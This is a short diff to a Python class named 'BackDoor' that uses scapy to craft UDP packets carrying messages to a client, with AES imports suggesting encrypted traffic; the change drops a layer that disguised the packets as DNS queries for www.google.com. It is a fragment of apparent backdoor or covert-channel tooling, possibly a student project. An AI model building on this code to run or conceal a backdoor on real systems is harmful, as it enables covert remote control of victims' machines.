@@ -1,6 +1,5 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import UDP, IP
 from scapy.all import sniff, send
 from scapy.volatile import RandShort
@@ -27,9 +26,8 @@ class BackDoor:
         print(f"{self.client} is the clioent")
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.client_port)
-        dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
         payload = msg
-        pkt = ip / udp / dns / payload
+        pkt = ip / udp / payload
         try:
             print("crafting and sending")
             send(pkt, verbose=0)
